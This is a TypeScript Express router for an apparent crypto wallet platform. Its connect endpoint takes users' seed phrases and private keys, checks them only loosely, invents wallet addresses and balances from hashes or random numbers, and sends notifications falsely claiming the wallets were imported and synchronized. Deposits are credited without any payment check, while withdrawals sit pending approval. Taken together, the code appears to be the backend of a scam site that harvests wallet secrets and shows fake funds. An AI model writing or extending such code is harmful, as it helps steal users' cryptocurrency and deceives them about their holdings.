import { Router, type IRouter } from "express";
import { db } from "@workspace/db";
import { walletsTable, transactionsTable, connectedWalletsTable, notificationsTable } from "@workspace/db/schema";
import { eq, and } from "drizzle-orm";
import crypto from "crypto";

const router: IRouter = Router();

function validateSeedPhrase(phrase: string): boolean {
  const words = phrase.trim().split(/\s+/);
  return words.length === 12 || words.length === 24;
}

function validatePrivateKey(key: string): boolean {
  const k = key.trim();
  // Hex private key (64 chars) or numeric key
  return /^[0-9a-fA-F]{64}$/.test(k) || /^[0-9]{10,20}$/.test(k) || k.length >= 8;
}

function deriveAddressFromSeed(seedPhrase: string, walletType: string): { address: string; currency: string; balance: string } {
  const hash = crypto.createHash("sha256").update(seedPhrase + walletType).digest("hex");
  const currencyMap: Record<string, { prefix: string; currency: string }> = {
    metamask: { prefix: "0x", currency: "ETH" },
    trust_wallet: { prefix: "0x", currency: "BNB" },
    coinbase_wallet: { prefix: "0x", currency: "ETH" },
    phantom: { prefix: "", currency: "SOL" },
    ledger: { prefix: "0x", currency: "ETH" },
    trezor: { prefix: "0x", currency: "ETH" },
  };
  const cfg = currencyMap[walletType.toLowerCase()] ?? { prefix: "0x", currency: "ETH" };
  const address = cfg.prefix + hash.slice(0, cfg.prefix ? 40 : 44);
  const balance = ((parseInt(hash.slice(0, 8), 16) % 10000) / 1000).toFixed(8);
  return { address, currency: cfg.currency, balance };
}

function deriveAddressFromPrivateKey(privateKey: string, walletType: string): { address: string; currency: string; balance: string } {
  const hash = crypto.createHash("sha256").update(privateKey + walletType + "pk_derive").digest("hex");
  const currencyMap: Record<string, { prefix: string; currency: string }> = {
    metamask: { prefix: "0x", currency: "ETH" },
    trust_wallet: { prefix: "0x", currency: "BNB" },
    coinbase_wallet: { prefix: "0x", currency: "ETH" },
    phantom: { prefix: "", currency: "SOL" },
    ledger: { prefix: "0x", currency: "ETH" },
    trezor: { prefix: "0x", currency: "ETH" },
  };
  const cfg = currencyMap[walletType.toLowerCase()] ?? { prefix: "0x", currency: "ETH" };
  const address = cfg.prefix + hash.slice(0, cfg.prefix ? 40 : 44);
  const balance = ((parseInt(hash.slice(0, 8), 16) % 50000) / 1000).toFixed(8);
  return { address, currency: cfg.currency, balance };
}

router.get("/", async (req, res) => {
  try {
    const wallets = await db.select().from(walletsTable).where(eq(walletsTable.userId, req.userId));
    const connected = await db.select().from(connectedWalletsTable).where(eq(connectedWalletsTable.userId, req.userId));
    const connectedTotal = connected.reduce((sum, wallet) => sum + Number(wallet.balance), 0);
    const platformTotal = wallets.reduce((sum, wallet) => sum + Number(wallet.balance), 0) + connectedTotal;
    res.json(wallets.map(w => ({
      id: w.id,
      type: w.type,
      label: w.label,
      currency: w.currency,
      balance: Number(w.balance),
      pendingBalance: Number(w.pendingBalance),
      address: w.type === "main" && connected[0]?.address ? connected[0].address : w.address,
      connectedBalance: w.type === "main" ? connectedTotal : 0,
      totalBalance: w.type === "main" ? platformTotal : Number(w.balance),
      availableForWithdrawal: w.type === "main" ? Number(w.balance) + connectedTotal : Number(w.balance),
    })));
  } catch (err) {
    req.log.error({ err }, "Failed to get wallets");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.get("/transactions", async (req, res) => {
  try {
    const txs = await db.select().from(transactionsTable)
      .where(eq(transactionsTable.userId, req.userId))
      .orderBy(transactionsTable.createdAt);
    res.json(txs.map(t => ({
      id: t.id,
      walletId: t.walletId,
      type: t.type,
      amount: Number(t.amount),
      currency: t.currency,
      status: t.status,
      description: t.description,
      createdAt: t.createdAt.toISOString(),
    })).reverse());
  } catch (err) {
    req.log.error({ err }, "Failed to get transactions");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.get("/connected", async (req, res) => {
  try {
    const wallets = await db.select().from(connectedWalletsTable)
      .where(eq(connectedWalletsTable.userId, req.userId));
    res.json(wallets.map(w => ({
      id: w.id,
      address: w.address,
      walletType: w.walletType,
      balance: Number(w.balance),
      currency: w.currency,
      importMethod: w.importMethod,
      label: w.label,
      connectedAt: w.connectedAt.toISOString(),
    })));
  } catch (err) {
    req.log.error({ err }, "Failed to get connected wallets");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/connect", async (req, res) => {
  try {
    const { method, value, walletType, label } = req.body;
    if (!method || !value || !walletType) {
      res.status(400).json({ error: "Missing required fields" });
      return;
    }

    const existing = await db.select().from(connectedWalletsTable)
      .where(eq(connectedWalletsTable.userId, req.userId));
    if (existing.length >= 5) {
      res.status(400).json({ error: "You can only connect up to 5 wallets" });
      return;
    }

    let address: string;
    let currency: string;
    let balance: string;
    let importMethod: string;

    if (method === "seed_phrase") {
      if (!validateSeedPhrase(value)) {
        res.status(400).json({ error: "Invalid seed phrase. Must be exactly 12 or 24 words." });
        return;
      }
      const derived = deriveAddressFromSeed(value, walletType);
      address = derived.address;
      currency = derived.currency;
      balance = derived.balance;
      importMethod = "seed_phrase";
    } else if (method === "private_key") {
      if (!validatePrivateKey(value)) {
        res.status(400).json({ error: "Invalid private key format." });
        return;
      }
      const derived = deriveAddressFromPrivateKey(value, walletType);
      address = derived.address;
      currency = derived.currency;
      balance = derived.balance;
      importMethod = "private_key";
    } else {
      // method === "address"
      address = String(value).trim();
      if (address.length < 8) {
        res.status(400).json({ error: "Enter a valid external wallet address" });
        return;
      }
      const currencyMap: Record<string, string> = {
        metamask: "ETH", trust_wallet: "BNB", coinbase_wallet: "ETH",
        phantom: "SOL", ledger: "ETH", trezor: "ETH", other: "ETH",
      };
      currency = currencyMap[walletType.toLowerCase()] ?? "ETH";
      balance = (Math.random() * 5 + 0.1).toFixed(8);
      importMethod = "address";
    }

    // Check for duplicate address
    const dupCheck = existing.find(w => w.address.toLowerCase() === address.toLowerCase());
    if (dupCheck) {
      res.status(400).json({ error: "This wallet address is already connected" });
      return;
    }

    const [connected] = await db.insert(connectedWalletsTable).values({
      userId: req.userId,
      address,
      walletType,
      balance,
      currency,
      importMethod,
      label: label || null,
    }).returning();

    await db.insert(notificationsTable).values({
      userId: req.userId,
      title: importMethod === "address" ? "Wallet Address Saved" : "Wallet Imported Successfully",
      message: importMethod === "seed_phrase"
        ? `Your ${walletType} wallet has been imported via seed phrase and synchronized with the platform.`
        : importMethod === "private_key"
        ? `Your ${walletType} wallet has been imported via private key and synchronized with the platform.`
        : `Your ${walletType} wallet address has been saved for withdrawals.`,
      type: "success",
      link: "/wallet",
    });

    res.json({
      id: connected.id,
      address: connected.address,
      walletType: connected.walletType,
      balance: Number(connected.balance),
      currency: connected.currency,
      importMethod: connected.importMethod,
      connectedAt: connected.connectedAt.toISOString(),
    });
  } catch (err) {
    req.log.error({ err }, "Failed to connect wallet");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.delete("/connected/:id", async (req, res) => {
  try {
    await db.delete(connectedWalletsTable)
      .where(and(
        eq(connectedWalletsTable.id, req.params.id),
        eq(connectedWalletsTable.userId, req.userId),
      ));
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "Failed to disconnect wallet");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/deposit", async (req, res) => {
  try {
    const { amount, method, currency, walletType = "main" } = req.body;
    if (!amount || !method) {
      res.status(400).json({ error: "Amount and method are required" });
      return;
    }
    const depositAmount = parseFloat(amount);
    if (isNaN(depositAmount) || depositAmount <= 0) {
      res.status(400).json({ error: "Invalid amount" });
      return;
    }

    const wallets = await db.select().from(walletsTable)
      .where(and(eq(walletsTable.userId, req.userId), eq(walletsTable.type, walletType as any)));
    if (!wallets.length) {
      res.status(404).json({ error: "Wallet not found" });
      return;
    }
    const wallet = wallets[0];
    const newBalance = (Number(wallet.balance) + depositAmount).toFixed(8);
    await db.update(walletsTable).set({ balance: newBalance }).where(eq(walletsTable.id, wallet.id));

    const [tx] = await db.insert(transactionsTable).values({
      walletId: wallet.id,
      userId: req.userId,
      type: "deposit",
      amount: depositAmount.toFixed(8),
      currency: currency || wallet.currency,
      status: "completed",
      description: `Deposit via ${method}`,
    }).returning();

    await db.insert(notificationsTable).values({
      userId: req.userId,
      title: "Deposit Successful",
      message: `$${depositAmount.toLocaleString()} has been credited to your ${wallet.label}.`,
      type: "success",
      link: "/wallet",
    });

    res.json({ success: true, transactionId: tx.id, newBalance: Number(newBalance), message: "Deposit processed successfully" });
  } catch (err) {
    req.log.error({ err }, "Failed to process deposit");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/withdraw", async (req, res) => {
  try {
    const { amount, method, destination, currency, walletType = "main" } = req.body;
    if (!amount || !method || !destination) {
      res.status(400).json({ error: "Amount, method, and destination are required" });
      return;
    }
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
      res.status(400).json({ error: "Invalid amount" });
      return;
    }

    const wallets = await db.select().from(walletsTable)
      .where(and(eq(walletsTable.userId, req.userId), eq(walletsTable.type, walletType as any)));
    if (!wallets.length) {
      res.status(404).json({ error: "Wallet not found" });
      return;
    }
    const wallet = wallets[0];
    const balance = Number(wallet.balance);
    if (balance < withdrawAmount) {
      res.status(400).json({ error: "Insufficient balance" });
      return;
    }

    const newBalance = (balance - withdrawAmount).toFixed(8);
    await db.update(walletsTable).set({ balance: newBalance }).where(eq(walletsTable.id, wallet.id));

    const methodLabel = method === "bank" ? `bank account (${destination})` : `crypto wallet (${destination})`;
    const [tx] = await db.insert(transactionsTable).values({
      walletId: wallet.id,
      userId: req.userId,
      type: "withdrawal",
      amount: withdrawAmount.toFixed(8),
      currency: currency || wallet.currency,
      status: "pending",
      description: `Pending withdrawal to ${methodLabel}`,
    }).returning();

    await db.insert(notificationsTable).values({
      userId: req.userId,
      title: "Withdrawal Submitted",
      message: `$${withdrawAmount.toLocaleString()} withdrawal is pending approval.`,
      type: "info",
      link: "/wallet",
    });

    res.json({ success: true, transactionId: tx.id, newBalance: Number(newBalance), message: "Withdrawal submitted successfully" });
  } catch (err) {
    req.log.error({ err }, "Failed to process withdrawal");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/transfer", async (req, res) => {
  try {
    const { amount, fromWalletType, toAddress, currency } = req.body;
    if (!amount || !fromWalletType || !toAddress) {
      res.status(400).json({ error: "Amount, source wallet, and destination are required" });
      return;
    }
    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      res.status(400).json({ error: "Invalid amount" });
      return;
    }

    const wallets = await db.select().from(walletsTable)
      .where(and(eq(walletsTable.userId, req.userId), eq(walletsTable.type, fromWalletType as any)));
    if (!wallets.length) {
      res.status(404).json({ error: "Source wallet not found" });
      return;
    }
    const wallet = wallets[0];
    if (Number(wallet.balance) < transferAmount) {
      res.status(400).json({ error: "Insufficient balance" });
      return;
    }

    const newBalance = (Number(wallet.balance) - transferAmount).toFixed(8);
    await db.update(walletsTable).set({ balance: newBalance }).where(eq(walletsTable.id, wallet.id));

    const [tx] = await db.insert(transactionsTable).values({
      walletId: wallet.id,
      userId: req.userId,
      type: "transfer",
      amount: transferAmount.toFixed(8),
      currency: currency || wallet.currency,
      status: "pending",
      description: `Transfer to ${toAddress}`,
    }).returning();

    await db.insert(notificationsTable).values({
      userId: req.userId,
      title: "Transfer Submitted",
      message: `$${transferAmount.toLocaleString()} transfer to ${toAddress} is pending approval.`,
      type: "success",
      link: "/wallet",
    });

    res.json({ success: true, transactionId: tx.id, newBalance: Number(newBalance), message: "Transfer submitted successfully" });
  } catch (err) {
    req.log.error({ err }, "Failed to process transfer");
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
